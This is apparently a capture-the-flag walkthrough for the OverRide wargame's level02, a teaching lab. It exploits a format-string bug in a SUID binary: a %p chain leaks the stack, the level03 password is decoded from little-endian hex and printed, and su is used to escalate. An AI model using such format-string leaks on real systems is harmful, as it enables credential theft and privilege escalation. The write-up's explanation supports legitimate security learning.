# Level02 - Walkthrough

## 1. Reconnaissance

When we log in as `level02`, we find a binary:

```
level02@OverRide:~$ ls -la
-rwsr-s---+ 1 level03 users 9452 Sep 10  2016 level02
```

The binary is **SUID level03**, meaning if we exploit it, we run code as `level03`.

---

## 2. Disassembling the binary

We open the binary in gdb and disassemble `main`:

```
level02@OverRide:~$ gdb ./level02
(gdb) disas main
```

From the disassembly, we can reconstruct what the program does in C:

```c
int main(int argc, char **argv)
{
    char username[100];       // rbp-0x70,  100 bytes
    char file_pass[41];       // rbp-0xa0,   41 bytes
    char password[100];       // rbp-0x110, 100 bytes
    FILE *f;                  // rbp-0x8
    int bytes_read;           // rbp-0xc

    // Step A: Open the password file
    f = fopen("/home/users/level03/.pass", "r");
    if (f == NULL) {
        fwrite("ERROR: failed to open file\n", 1, 36, stderr);
        exit(1);
    }

    // Step B: Read the password from file (41 bytes)
    bytes_read = fread(file_pass, 1, 41, f);
    file_pass[strcspn(file_pass, "\n")] = '\0';

    if (bytes_read != 41) {
        fwrite("ERROR: failed to read file\n", 1, 36, stderr);
        exit(1);
    }
    fclose(f);

    // Step C: Ask for username and password
    puts("===== [ Secure Access System v1.0 ] =====");
    puts("/***************************************\\");
    puts("| You must login to access this system. |");
    puts("\\**************************************/");
    printf("--[ Username: ");
    fgets(username, 100, stdin);
    username[strcspn(username, "\n")] = '\0';

    printf("--[ Password: ");
    fgets(password, 100, stdin);
    password[strcspn(password, "\n")] = '\0';

    puts("*****************************************");

    // Step D: Compare and decide
    if (strncmp(file_pass, password, 41) == 0) {
        printf("Greetings, %s!\n", username);
        system("/bin/sh");
        return 0;
    } else {
        printf(username);  // <--- VULNERABILITY
        puts(" does not have access!");
        exit(1);
    }
}
```

---

## 3. Identifying the vulnerability

At the end of `main`, when login fails, we see:

```c
printf(username);
```

instead of:

```c
printf("%s", username);
```

This is a **format string vulnerability**. When `printf` receives a user-controlled string as its first argument (the format string), the user can inject format specifiers like `%p`, `%x`, `%s`, etc. to **read values from the stack**.

### Why is this dangerous?

`printf` expects its format string to tell it how many extra arguments to read. When we write `%p`, printf reads the next value from the stack and prints it as a pointer. Since we control the format string, we can read **any values on the stack** — including the password that was loaded from the file.

---

## 4. Understanding the stack layout

From the disassembly, the local variables are laid out like this on the stack:

```
High addresses (top of stack)
┌──────────────────────────┐
│ rbp                      │ ← base pointer
├──────────────────────────┤
│ f (FILE*)        rbp-0x8 │ 8 bytes
├──────────────────────────┤
│ bytes_read       rbp-0xc │ 4 bytes
├──────────────────────────┤
│                          │
│ username        rbp-0x70 │ 100 bytes
│                          │
├──────────────────────────┤
│                          │
│ file_pass       rbp-0xa0 │ 41 bytes
│                          │
├──────────────────────────┤
│                          │
│ password       rbp-0x110 │ 100 bytes
│                          │
└──────────────────────────┘
Low addresses (bottom of stack)
```

The key insight: **the file password (`file_pass`) is stored on the stack**. Since our format string attack lets us read stack values, we can read the password directly from memory.

---

## 5. How printf reads arguments on x86_64

On **x86_64 Linux**, the calling convention passes the first 6 arguments in registers:

| %p position | Source    |
|-------------|-----------|
| 1st         | rsi       |
| 2nd         | rdx       |
| 3rd         | rcx       |
| 4th         | r8        |
| 5th         | r9        |
| 6th+        | **stack** |

After the first 5 format specifiers consume the registers, each subsequent `%p` reads the next 8 bytes from the stack. By using enough `%p` specifiers, we can walk up the stack until we reach the memory location where `file_pass` is stored.

---

## 6. Leaking the stack

We run the program and enter a long chain of `%p` as the username:

```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
--[ Password: abc
*****************************************
0x7fffffffe3e0.(nil).0x61.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.0x7fffffffe5d8.0x1f7ff9a08.0x636261.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).0x100000000.(nil).0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.(nil).0x70252e70252e7025 does not have access!
```

---

## 7. Finding the password in the leak

We examine the leaked values. Most are `(nil)` (zero) or recognizable patterns:

- `0x2a2a2a2a2a2a2a2a` = `"********"` (the asterisks printed in the UI)
- `0x636261` = `"abc"` (our password input, reversed because little-endian)

Then we spot **5 consecutive non-null values** at positions 22-26:

```
Position 22: 0x756e505234376848
Position 23: 0x45414a3561733951
Position 24: 0x377a7143574e6758
Position 25: 0x354a35686e475873
Position 26: 0x48336750664b394d
```

These values are surrounded by nulls and contain bytes in the ASCII printable range (0x30-0x7a). This is the `file_pass` buffer — the password read from the `.pass` file.

### Why 5 values?

The password is 41 bytes. Each `%p` reads 8 bytes. 5 × 8 = 40 bytes, which covers the password (the 41st byte is the null terminator).

---

## 8. Converting hex to ASCII (little-endian)

On x86_64, multi-byte values are stored in **little-endian** format: the least significant byte is stored at the lowest address. This means when we read a value like `0x756e505234376848`, the bytes in memory order are reversed:

```
0x756e505234376848
  ↓ split into bytes (high to low):
  75 6e 50 52 34 37 68 48
  ↓ reverse for memory order (little-endian):
  48 68 37 34 52 50 6e 75
  ↓ convert to ASCII:
  H  h  7  4  R  P  n  u
```

Doing this for all 5 values:

| Hex value              | Reversed bytes                     | ASCII      |
|------------------------|------------------------------------|------------|
| `0x756e505234376848`   | 48 68 37 34 52 50 6e 75            | `Hh74RPnu` |
| `0x45414a3561733951`   | 51 39 73 61 35 4a 41 45            | `Q9sa5JAE` |
| `0x377a7143574e6758`   | 58 67 4e 57 43 71 7a 37            | `XgNWCqz7` |
| `0x354a35686e475873`   | 73 58 47 6e 68 35 4a 35            | `sXGnh5J5` |
| `0x48336750664b394d`   | 4d 39 4b 66 50 67 33 48            | `M9KfPg3H` |

Concatenated: **`Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`**

---

## 9. Using the password

```
level02@OverRide:~$ su level03
Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
level03@OverRide:~$
```

We are now `level03`.

---

## Key concepts

- **Format String Vulnerability**: passing user input directly as printf's format string lets attackers read (and sometimes write) arbitrary memory.
- **x86_64 Calling Convention**: first 5 arguments in registers, rest on the stack — this determines the offset to reach our target data.
- **Little-Endian Byte Order**: x86 stores the least significant byte first, so hex values must be reversed byte-by-byte when converting to strings.
- **SUID Binaries**: the program runs with the permissions of its owner (`level03`), which is why it can read `/home/users/level03/.pass`.